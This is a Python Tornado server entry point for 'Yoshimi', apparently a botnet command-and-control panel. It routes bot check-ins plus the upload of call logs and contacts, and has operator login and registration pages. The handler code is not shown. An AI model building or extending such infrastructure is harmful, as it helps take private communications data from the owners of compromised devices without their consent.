# -*- coding: utf-8 -*-
'''
Created on Mar 15, 2012

@author: moloch

    Copyright [2012] [Redacted Labs]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
'''


import logging
import tornado.web

from os import urandom, path
from base64 import b64encode
from tornado import netutil, options
from tornado.web import Application
from tornado.web import StaticFileHandler 
from tornado.httpserver import HTTPServer
from tornado.ioloop import IOLoop, PeriodicCallback
from models import dbsession
from modules.Menu import Menu
from modules.Sidebar import Sidebar
from handlers.BotHandlers import *
from handlers.UserHandlers import *
from handlers.ErrorHandlers import *
from handlers.PublicHandlers import *

### Logging configuration
logging.basicConfig(format = '\r[%(levelname)s] %(asctime)s - %(message)s', level = logging.DEBUG)
logging.info("Yoshimi starting up ...")

application = Application([
        #Static Handlers - Serves static CSS, JavaScript and image files
        (r'/static/(.*)', StaticFileHandler, {'path': 'static'}),

        # Bot command and control handlers
        (r'/bot/hello(.*)', BotHelloHandler, {'dbsession': dbsession}),
        (r'/bot/version(.*)', BotVersionHandler, {'dbsession': dbsession}),
        (r'/bot/calls(.*)', BotCallsHandler, {'dbsession': dbsession}),
        (r'/bot/contacts(.*)', BotContactsHandler, {'dbsession': dbsession}),
        (r'/bot/ping', BotPingHandler, {'dbsession': dbsession}),

        # Public handlers - Serves all public pages
        (r'/', WelcomeHandler),
        (r'/login', LoginHandler, {'dbsession': dbsession}),
        (r'/register', RegistrationHandler, {'dbsession': dbsession}),
        (r'/about', AboutHandler),

        # User Handlers - Serves user related pages
        (r'/home', HomeHandler, {'dbsession': dbsession}),
        (r'/settings', SettingsHandler, {'dbsession': dbsession}),
        (r'/logout', LogoutHandler),
      
        # Error handlers - Serves error pages
        (r'/403', UnauthorizedHandler),
        (r'/(.*).php(.*)', PhpHandler),
        (r'/(.*)', NotFoundHandler)
    ],

    # Template directory
    template_path = 'templates',
                          
    # Randomly generated secret key
    cookie_secret = b64encode(urandom(64)),

    # Requests that do not pass @authenticated  will be redirected here
    login_url = '/login',
    
    # UI Modules
    ui_modules = {"Menu": Menu, "Sidebar": Sidebar},

    # Milli-Seconds between session clean up
    clean_up_timeout = int(60 * 1000),

    # Debug mode
    debug = True,
    
    # Application version
    version = '0.0.1'
)
### Main entry point
def start_server():
    ''' Main entry point for the application '''
    sockets = netutil.bind_sockets(8888)
    server = HTTPServer(application)
    server.add_sockets(sockets)
    io_loop = IOLoop.instance()
    session_manager = SessionManager.Instance()    
    session_clean_up = PeriodicCallback(
        session_manager.clean_up,
        application.settings['clean_up_timeout'],
        io_loop = io_loop
    )
    try:
        logging.info("Weapon systems online, good hunting.")
        io_loop.start()
        session_clean_up.start()
    except KeyboardInterrupt:
        logging.warn("Keyboard interrupt, shutdown everything!")
        session_clean_up.stop()
        io_loop.stop()
